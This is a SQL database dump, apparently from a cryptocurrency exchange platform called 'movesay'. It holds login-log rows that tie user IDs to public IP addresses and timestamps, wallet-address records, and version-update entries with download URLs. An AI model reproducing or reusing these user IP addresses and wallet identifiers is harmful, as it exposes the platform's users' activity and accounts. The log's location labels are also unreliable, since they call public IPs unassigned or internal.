INSERT INTO `movesay_user_log` VALUES ('848266', '5045', '登录', 'Login', '通过用户名登录', 'Login by account', '119.139.175.227', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1506473754', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848267', '5048', '登录', null, '通过用户名登录', null, '119.139.175.227', '未分配或者内网IP', null, '0', '1506473779', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848268', '5050', '登录', 'Login', '通过用户名登录', 'Login by account', '119.139.175.227', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1506474135', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848269', '5045', '登录', 'Login', '通过用户名登录', 'Login by account', '113.90.96.242', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1506481102', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848270', '5050', '登录', 'Login', '通过用户名登录', 'Login by account', '113.90.96.242', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1506481297', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848271', '5050', '登录', 'Login', '通过用户名登录', 'Login by account', '113.90.96.242', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1506493859', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848272', '5048', '登录', null, '通过用户名登录', null, '119.139.172.6', '未分配或者内网IP', null, '0', '1506495110', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848273', '5050', '登录', 'Login', '通过用户名登录', 'Login by account', '119.139.172.6', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1506496731', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848274', '5052', '登录', 'Login', '通过用户名登录', 'Login by account', '123.151.152.217', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1506508687', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848275', '5051', '登录', 'Login', '通过用户名登录', 'Login by account', '119.139.172.6', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1506511012', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848276', '5050', '登录', 'Login', '通过用户名登录', 'Login by account', '113.90.96.242', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1506565399', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848277', '5048', '登录', null, '通过用户名登录', null, '119.139.172.6', '未分配或者内网IP', null, '0', '1506565541', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848278', '5048', '登录', null, '通过用户名登录', null, '110.249.162.18', '未分配或者内网IP', null, '0', '1506566863', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848279', '5050', '登录', 'Login', '通过用户名登录', 'Login by account', '113.90.96.242', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1506579822', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848280', '5048', '登录', null, '通过用户名登录', null, '119.139.172.6', '未分配或者内网IP', null, '0', '1506583787', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848281', '5048', '登录', null, '通过用户名登录', null, '119.139.172.6', '未分配或者内网IP', null, '0', '1506583879', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848282', '5050', '登录', 'Login', '通过用户名登录', 'Login by account', '113.90.96.242', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1506584015', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848283', '5045', '登录', 'Login', '通过用户名登录', 'Login by account', '113.90.96.242', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1506584071', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848284', '5050', '登录', null, '通过用户名登录', null, '113.90.96.242', '未分配或者内网IP', null, '0', '1506584140', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848285', '5050', '登录', null, '通过用户名登录', null, '113.90.96.242', '未分配或者内网IP', null, '0', '1506584142', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848286', '5050', '登录', null, '通过用户名登录', null, '119.139.172.6', '未分配或者内网IP', null, '0', '1506584917', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848287', '5048', '登录', null, '通过用户名登录', null, '106.114.23.230', '未分配或者内网IP', null, '0', '1506612490', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848288', '5044', '登录', 'Login', '通过用户名登录', 'Login by account', '220.173.127.251', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1506735833', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848289', '5048', '登录', null, '通过用户名登录', null, '113.116.207.165', '未分配或者内网IP', null, '0', '1506757917', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848290', '5055', '登录', 'Login', '通过用户名登录', 'Login by account', '175.10.40.216', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1509260460', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848291', '5055', '登录', 'Login', '通过邮箱登录', 'Login by email', '175.10.40.216', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1509263521', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848292', '5050', '登录', 'Login', '通过用户名登录', 'Login by account', '113.116.204.216', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1509521292', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848293', '5057', '登录', 'Login', '通过用户名登录', 'Login by account', '49.90.3.232', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1509622635', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848294', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '113.116.204.216', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1509681666', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848295', '5059', '登录', 'Login', '通过用户名登录', 'Login by account', '125.117.212.191', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1509754535', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848296', '5059', '登录', 'Login', '通过用户名登录', 'Login by account', '125.117.212.191', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1509754562', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848297', '5074', '登录', null, '通过用户名登录', null, '14.153.185.120', '未分配或者内网IP', null, '0', '1513664188', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848298', '5075', '登录', null, '通过用户名登录', null, '14.153.185.120', '未分配或者内网IP', null, '0', '1513665113', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848299', '5077', '登录', 'Login', '通过用户名登录', 'Login by account', '119.123.59.55', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1514299712', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848300', '5077', '登录', 'Login', '通过用户名登录', 'Login by account', '119.123.59.55', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1514299874', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848301', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.186.193', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1514340344', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848302', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.243', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1514340811', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848303', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.186.193', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1514341009', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848304', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.187.111', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1514875412', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848305', '5048', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.187.111', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1514876765', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848306', '5048', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.187.118', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1514876862', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848307', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.187.111', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1514877073', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848308', '5048', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.187.111', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1514877217', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848309', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.187.111', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1514877301', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848310', '5048', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.187.118', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1514877355', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848311', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.187.118', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1514878042', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848312', '5048', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.187.118', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1514878781', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848313', '5048', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.187.118', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1514880724', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848314', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.185.125', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1515036492', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848315', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.43', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1515392976', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848316', '5048', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.43', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1515410166', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848317', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.169', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1515410592', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848318', '5095', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.169', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1515411222', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848319', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.43', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1515471736', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848320', '5095', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.169', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1515488489', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848321', '5095', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.43', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1515488716', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848322', '5048', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.43', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1515488774', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848323', '5095', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.43', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1515488936', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848324', '5048', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.169', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1515489202', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848325', '5095', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.43', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1515489538', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848326', '5048', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.169', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1515489967', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848327', '5095', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.169', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1515490025', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848328', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.81', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1516008257', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848329', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.186.26', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1516083046', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848330', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '115.198.90.54', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1516096215', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848331', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.187.99', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1516603947', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848332', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.187.99', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1516604466', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848333', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.132', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1516695078', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848334', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.132', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1516695080', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848335', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '119.123.33.137', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1516779083', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848336', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '119.123.33.137', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1516779980', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848337', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '119.123.33.137', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1516782511', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848338', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.10', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1516933673', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848339', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.185.219', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1516936441', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848340', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '113.88.52.154', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1517022425', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848341', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '119.123.148.85', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1517212726', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848342', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.116.137.166', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1517212851', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848343', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '113.118.225.250', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1517282522', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848344', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.187.131', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1517384146', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848345', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.187.224', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1517798284', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848346', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '117.25.107.100', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1518076249', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848347', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.93', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1519724746', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848348', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '175.191.2.115', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1519777627', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848349', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.238', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1519800856', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848350', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '60.30.201.30', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1520329872', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848351', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.187.226', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1520496369', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848352', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.187.226', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1520502252', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848353', '5131', '登录', 'Login', '通过用户名登录', 'Login by account', '218.108.150.186', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1520554912', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848354', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.86', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1520564715', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848355', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '118.241.225.186', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1520747238', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848356', '5136', '登录', 'Login', '通过用户名登录', 'Login by account', '118.73.44.193', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1520815574', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848357', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.127', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1520905423', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848358', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.127', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1520922410', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848359', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.185.142', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1521103452', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848360', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.185.142', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1521108636', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848361', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.186.25', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1521114465', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848362', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '127.0.0.1', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1521442250', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848363', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '127.0.0.1', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1521514678', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848364', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '127.0.0.1', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1521595660', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848365', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '127.0.0.1', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1521604438', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848366', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '127.0.0.1', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1521680875', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848367', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '127.0.0.1', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1521690422', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848368', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '127.0.0.1', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1521692319', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848369', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '127.0.0.1', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1521701374', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848370', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '10.1.0.176', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1521708802', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848371', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '10.1.1.6', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1521710313', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848372', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.186.151', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1522030884', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848373', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '127.0.0.1', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1522136052', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848374', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '127.0.0.1', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1522198893', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848375', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '127.0.0.1', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1522404514', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('848376', '5058', '登录', 'Login', '通过用户名登录', 'Login by account', '127.0.0.1', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1522634851', '0', '1');

-- ----------------------------
-- Table structure for movesay_user_qianbao
-- ----------------------------
DROP TABLE IF EXISTS `movesay_user_qianbao`;
CREATE TABLE `movesay_user_qianbao` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `coinname` varchar(200) NOT NULL,
  `name` varchar(200) NOT NULL,
  `addr` varchar(200) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`),
  KEY `coinname` (`coinname`)
) ENGINE=MyISAM AUTO_INCREMENT=8213 DEFAULT CHARSET=utf8 COMMENT='用户钱包表';

-- ----------------------------
-- Records of movesay_user_qianbao
-- ----------------------------
INSERT INTO `movesay_user_qianbao` VALUES ('8205', '4964', 'sgc', 'rzh', 'lrj001', '0', '1505446829', '0', '1');
INSERT INTO `movesay_user_qianbao` VALUES ('8207', '4966', 'sgc', '在线钱包', 'yCnqSPJUPoEIlpBVy5AyEL1xbOmqyPmZGH', '0', '1505466805', '0', '1');
INSERT INTO `movesay_user_qianbao` VALUES ('8208', '4944', 'sgc', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', '0', '1505471253', '0', '1');
INSERT INTO `movesay_user_qianbao` VALUES ('8209', '5041', 'sgc', '1', '17570e790b0a2cb94a1148fe33fde3d0', '0', '1506050798', '0', '1');
INSERT INTO `movesay_user_qianbao` VALUES ('8210', '5052', 'sgc', 'cxw', 'd125e7cae74619a33c9e91daee668f56', '0', '1506508781', '0', '1');
INSERT INTO `movesay_user_qianbao` VALUES ('8212', '5131', 'sgc', 'xqp', 'IwcuSV1H2nZYCkpvGAHjycXg4494UTJ2Qm', '0', '1520555109', '0', '1');

-- ----------------------------
-- Table structure for movesay_user_shopaddr
-- ----------------------------
DROP TABLE IF EXISTS `movesay_user_shopaddr`;
CREATE TABLE `movesay_user_shopaddr` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL DEFAULT '0',
  `truename` varchar(200) NOT NULL DEFAULT '0',
  `moble` varchar(500) NOT NULL,
  `name` varchar(500) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_user_shopaddr
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_version
-- ----------------------------
DROP TABLE IF EXISTS `movesay_version`;
CREATE TABLE `movesay_version` (
  `name` varchar(50) NOT NULL COMMENT '版本号',
  `number` int(11) NOT NULL COMMENT '序列号，一般用日期数字标示',
  `title` varchar(50) NOT NULL COMMENT '版本名',
  `create_time` int(11) NOT NULL COMMENT '发布时间',
  `update_time` int(11) NOT NULL COMMENT '更新的时间',
  `log` text NOT NULL COMMENT '更新日志',
  `url` varchar(150) NOT NULL COMMENT '链接到的远程文章',
  `is_current` tinyint(4) NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`name`),
  KEY `id` (`number`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='自动更新表';

-- ----------------------------
-- Records of movesay_version
-- ----------------------------
INSERT INTO `movesay_version` VALUES ('2.3.7', '10015', '修复更新', '1466394377', '1466394471', '修复首页下拉导航条显示bug\r\n修复交易界面导航条下拉bug', 'http://101.201.199.224/Update/download/2.3.7.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.3.8', '10016', '更新权限', '1467096687', '1467096830', '更新权限部分（还未完善）', 'http://101.201.199.224/Update/download/2.3.8.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.3.9', '10017', '更新后台内容管理', '1467105573', '1467106204', '更新后台内容管理', 'http://101.201.199.224/Update/download/2.3.9.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.0', '10018', '更新后台用户管理部分', '1467111754', '1467111785', '更新后台用户管理部分', 'http://101.201.199.224/Update/download/2.4.0.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.1', '10019', '优化扩展功能', '1467119925', '1467119937', '优化扩展功能', 'http://101.201.199.224/Update/download/2.4.1.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.2', '10020', '优化后台用户编辑', '1467185261', '1467190442', '优化后台用户编辑', 'http://101.201.199.224/Update/download/2.4.2.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.3', '10021', '优化后台菜单部分', '1467265786', '1467266307', '优化后台菜单部分', 'http://101.201.199.224/Update/download/2.4.3.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.4', '10022', '更新后台交易管理部分', '1467266348', '1467266573', '更新后台交易管理部分', 'http://101.201.199.224/Update/download/2.4.4.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.5', '10023', '优化财务部分', '1467270688', '1467270736', '优化人民币充值 提现\r\n优化虚拟币转入 转出\r\n\r\n需要重新配置充值方式', 'http://101.201.199.224/Update/download/2.4.5.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.6', '10024', '优化财务部分', '1467346688', '1467354994', '优化充值提现转入转出', 'http://101.201.199.224/Update/download/2.4.6.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.7', '10025', '更新人民币充值功能', '1467352025', '1467355004', '更新人民币充值功能\r\n优化软件不能自动到账\r\n优化前台充值弹窗的状态', 'http://101.201.199.224/Update/download/2.4.7.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.8', '10026', '优化自动更新功能', '1467361623', '0', '优化自动更新功能', 'http://101.201.199.224/Update/download/2.4.8.zip', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.4.9', '10027', '优化后台首页', '1467362093', '1467382933', '优化后台首页\r\n增加扩展 -客服代码  可以更换钱袋客服代码 \r\n更新之后，需要清理缓存', 'http://os.movesay.com/Auth/upFile/version/2.4.9', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.5.0', '10028', '优化所有后台功能', '1467601458', '1467699741', '优化所有后台功能但不包括应用部分\r\n在设置里面增加了导航设置可以控制前台导航了\r\n扩展里面增加客服代码可以更新客服代码了\r\n应用管理里面支持已经购买的 应用安装和卸载了\r\n增加有新的升级所有后台页面都会提示\r\n及时更新修复漏洞能使网站更安全\r\n更新人民币充值方式需要重新配置\r\n优化大部分后台授权可能有个别没有添加授权后期完善\r\n优化整个后台样式让您看着更舒服\r\n优化认购中心需要重新安装卸载如果提示没有授权请联系我们', 'http://os.movesay.com/Auth/upFile/version/2.5.0', '0', '0');
